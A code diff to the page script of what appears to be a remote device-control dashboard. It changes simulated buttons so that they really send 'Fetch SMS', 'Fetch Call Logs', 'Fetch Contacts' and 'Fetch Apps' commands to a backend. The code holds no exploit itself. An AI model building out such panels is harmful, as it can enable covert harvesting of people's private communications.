@@ -558,141 +558,184 @@
         }
     </style>
 
-    <script src="<?php echo base_url('assets/plugins/toastr/toastr.min.js'); ?>"></script>
+
     <script>
-        $(document).ready(function() {
-            // Initialize toastr
-            toastr.options = {
-                "closeButton": true,
-                "progressBar": true,
-                "positionClass": "toast-top-right",
-                "timeOut": "5000"
-            };
+        window.addEventListener('load', function() {
+            $(document).ready(function() {
+                // CSRF Token
+                const csrfName = '<?= csrf_token() ?>';
+                const csrfHash = '<?= csrf_hash() ?>';
 
-            // Command execution
-            $('.req_apps, .req_calls, .req_sms, .req_contacts, .req_all').click(function() {
-                const button = $(this);
-                const commandType = button.data('command');
-                const buttonText = button.find('span');
-                const originalText = buttonText.html();
-
-                // Disable button and show loading
-                button.prop('disabled', true);
-                buttonText.html('<i class="fas fa-spinner fa-spin mr-2"></i> Processing...');
-
-                // Simulate API call
-                setTimeout(() => {
-                    // Update last used time
-                    const now = new Date();
-                    const timeString = now.toLocaleDateString('en-US', {
-                        month: 'short',
-                        day: 'numeric',
-                        hour: '2-digit',
-                        minute: '2-digit'
-                    });
-
-                    $(`.req_${commandType}_last`).text(timeString);
-
-                    // Re-enable button
-                    button.prop('disabled', false);
-                    buttonText.html(originalText);
-
-                    // Show success message
-                    toastr.success(`${getCommandName(commandType)} request sent successfully!`, 'Command Executed');
-
-                    // Update command status
-                    $('#lastCommand').text(getCommandName(commandType));
-                    $('#commandStatus').html('<span class="badge badge-success">Completed</span>');
-
-                }, 2000);
-            });
-
-            // Execute all commands
-            $('#executeAllCommands').click(function() {
-                // Execute all commands sequentially
-                const commands = [
-                    { button: $('.req_apps'), type: 'apps' },
-                    { button: $('.req_calls'), type: 'calls' },
-                    { button: $('.req_sms'), type: 'sms' },
-                    { button: $('.req_contacts'), type: 'contacts' }
-                ];
-
-                let delay = 0;
-                commands.forEach((cmd, index) => {
-                    setTimeout(() => {
-                        cmd.button.click();
-                    }, delay);
-                    delay += 2500; // 2.5 second delay between commands
-                });
-
-                toastr.info('All commands have been queued for execution!', 'Commands Scheduled');
-            });
-
-            // Refresh connection
-            $('#refreshConnection').click(function() {
-                $(this).prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Checking...');
-
-                setTimeout(() => {
-                    $(this).prop('disabled', false).html('<i class="fas fa-sync-alt mr-1"></i> Refresh Connection');
-
-                    // Update status
-                    $('#connectionStatus').text('Online');
-                    $('#connectionBadge').removeClass('badge-danger').addClass('badge-success').text('Active');
-                    $('#lastPing').text('Just now');
-
-                    toastr.info('Connection refreshed successfully!', 'Connection Status');
-                }, 1500);
-            });
-
-            // Clear history
-            $('#clearHistory').click(function() {
-                $('#historyTable').html(`
-                <tr>
-                    <td colspan="4" class="text-center py-4">
-                        <i class="fas fa-history fa-2x text-muted mb-3"></i>
-                        <p class="text-muted">No command history</p>
-                    </td>
-                </tr>
-            `);
-
-                toastr.info('Command history cleared!', 'History Cleared');
-            });
-
-            // Helper functions
-            function getCommandName(type) {
-                const commands = {
-                    'apps': 'Fetch Apps',
-                    'calls': 'Fetch Call Logs',
-                    'sms': 'Fetch SMS',
-                    'contacts': 'Fetch Contacts',
-                    'all': 'Fetch All Data'
-                };
-                return commands[type] || type;
-            }
-
-            // Simulate battery updates
-            setInterval(() => {
-                const battery = Math.floor(Math.random() * 30) + 70; // 70-100%
-                $('#batteryLevel').text(battery + '%');
-                $('#batteryBar').css('width', battery + '%');
-
-                if (battery < 30) {
-                    $('#batteryBar').removeClass('bg-success').addClass('bg-danger');
-                    $('#batteryStatus').removeClass('badge-success').addClass('badge-danger')
-                        .html('<i class="fas fa-exclamation-circle mr-1"></i> Low');
-                } else if (battery < 50) {
-                    $('#batteryBar').removeClass('bg-success').addClass('bg-warning');
-                    $('#batteryStatus').removeClass('badge-success').addClass('badge-warning')
-                        .html('<i class="fas fa-exclamation-triangle mr-1"></i> Moderate');
-                } else {
-                    $('#batteryBar').removeClass('bg-warning bg-danger').addClass('bg-success');
-                    $('#batteryStatus').removeClass('badge-warning badge-danger').addClass('badge-success')
-                        .html('<i class="fas fa-check-circle mr-1"></i> Sufficient');
+                // Initialize toastr
+                if (typeof toastr !== 'undefined') {
+                    toastr.options = {
+                        "closeButton": true,
+                        "progressBar": true,
+                        "positionClass": "toast-top-right",
+                        "timeOut": "5000"
+                    };
                 }
 
-                // Update time
-                const minutes = Math.floor(Math.random() * 10) + 1;
-                $('#batteryTime').text(minutes + ' min ago');
-            }, 30000);
+                // Command execution
+                $('.req_apps, .req_calls, .req_sms, .req_contacts, .req_all').click(function() {
+                    const button = $(this);
+                    const commandType = button.data('command');
+                    const buttonText = button.find('span');
+                    const originalText = buttonText.html();
+
+                    // Disable button and show loading
+                    button.prop('disabled', true);
+                    buttonText.html('<i class="fas fa-spinner fa-spin mr-2"></i> Processing...');
+
+                    // Send AJAX Request
+                    $.ajax({
+                        url: '<?php echo base_url("requests/send_command"); ?>',
+                        type: 'POST',
+                        data: {
+                            command: commandType,
+                            [csrfName]: csrfHash // Ensure CSRF token is included if enabled
+                        },
+                        success: function(response) {
+                            if (response.success) {
+                                // Update last used time
+                                const now = new Date();
+                                const timeString = now.toLocaleDateString('en-US', {
+                                    month: 'short',
+                                    day: 'numeric',
+                                    hour: '2-digit',
+                                    minute: '2-digit'
+                                });
+
+                                $(`.req_${commandType}_last`).text(timeString);
+
+                                // Show success message
+                                if (typeof toastr !== 'undefined') {
+                                    toastr.success(response.message, 'Command Sent');
+                                } else {
+                                    alert(response.message);
+                                }
+
+                                // Update command status
+                                $('#lastCommand').text(getCommandName(commandType));
+                                $('#commandStatus').html('<span class="badge badge-success">Sent</span>');
+                            } else {
+                                if (typeof toastr !== 'undefined') {
+                                    toastr.warning(response.message, 'Warning');
+                                } else {
+                                    alert(response.message);
+                                }
+                                $('#commandStatus').html('<span class="badge badge-warning">Failed</span>');
+                            }
+                        },
+                        error: function(xhr, status, error) {
+                            if (typeof toastr !== 'undefined') {
+                                toastr.error('Failed to send command. Please try again.', 'Error');
+                            } else {
+                                alert('Failed to send command');
+                            }
+                            console.error(error);
+                        },
+                        complete: function() {
+                            // Re-enable button
+                            button.prop('disabled', false);
+                            buttonText.html(originalText);
+                        }
+                    });
+                });
+
+                // Execute all commands
+                $('#executeAllCommands').click(function() {
+                    // Execute all commands sequentially
+                    const commands = [
+                        { button: $('.req_apps'), type: 'apps' },
+                        { button: $('.req_calls'), type: 'calls' },
+                        { button: $('.req_sms'), type: 'sms' },
+                        { button: $('.req_contacts'), type: 'contacts' }
+                    ];
+
+                    let delay = 0;
+                    commands.forEach((cmd, index) => {
+                        setTimeout(() => {
+                            cmd.button.click();
+                        }, delay);
+                        delay += 2500; // 2.5 second delay between commands
+                    });
+
+                    if (typeof toastr !== 'undefined') {
+                        toastr.info('All commands have been queued for execution!', 'Commands Scheduled');
+                    }
+                });
+
+                // Refresh connection
+                $('#refreshConnection').click(function() {
+                    $(this).prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Checking...');
+
+                    setTimeout(() => {
+                        $(this).prop('disabled', false).html('<i class="fas fa-sync-alt mr-1"></i> Refresh Connection');
+
+                        // Update status
+                        $('#connectionStatus').text('Online');
+                        $('#connectionBadge').removeClass('badge-danger').addClass('badge-success').text('Active');
+                        $('#lastPing').text('Just now');
+
+                        if (typeof toastr !== 'undefined') {
+                            toastr.info('Connection refreshed successfully!', 'Connection Status');
+                        }
+                    }, 1500);
+                });
+
+                // Clear history
+                $('#clearHistory').click(function() {
+                    $('#historyTable').html(`
+                    <tr>
+                        <td colspan="4" class="text-center py-4">
+                            <i class="fas fa-history fa-2x text-muted mb-3"></i>
+                            <p class="text-muted">No command history</p>
+                        </td>
+                    </tr>
+                `);
+
+                    if (typeof toastr !== 'undefined') {
+                        toastr.info('Command history cleared!', 'History Cleared');
+                    }
+                });
+
+                // Helper functions
+                function getCommandName(type) {
+                    const commands = {
+                        'apps': 'Fetch Apps',
+                        'calls': 'Fetch Call Logs',
+                        'sms': 'Fetch SMS',
+                        'contacts': 'Fetch Contacts',
+                        'all': 'Fetch All Data'
+                    };
+                    return commands[type] || type;
+                }
+
+                // Simulate battery updates
+                setInterval(() => {
+                    const battery = Math.floor(Math.random() * 30) + 70; // 70-100%
+                    $('#batteryLevel').text(battery + '%');
+                    $('#batteryBar').css('width', battery + '%');
+
+                    if (battery < 30) {
+                        $('#batteryBar').removeClass('bg-success').addClass('bg-danger');
+                        $('#batteryStatus').removeClass('badge-success').addClass('badge-danger')
+                            .html('<i class="fas fa-exclamation-circle mr-1"></i> Low');
+                    } else if (battery < 50) {
+                        $('#batteryBar').removeClass('bg-success').addClass('bg-warning');
+                        $('#batteryStatus').removeClass('badge-success').addClass('badge-warning')
+                            .html('<i class="fas fa-exclamation-triangle mr-1"></i> Moderate');
+                    } else {
+                        $('#batteryBar').removeClass('bg-warning bg-danger').addClass('bg-success');
+                        $('#batteryStatus').removeClass('badge-warning badge-danger').addClass('badge-success')
+                            .html('<i class="fas fa-check-circle mr-1"></i> Sufficient');
+                    }
+
+                    // Update time
+                    const minutes = Math.floor(Math.random() * 10) + 1;
+                    $('#batteryTime').text(minutes + ' min ago');
+                }, 30000);
+            });
         });
     </script>
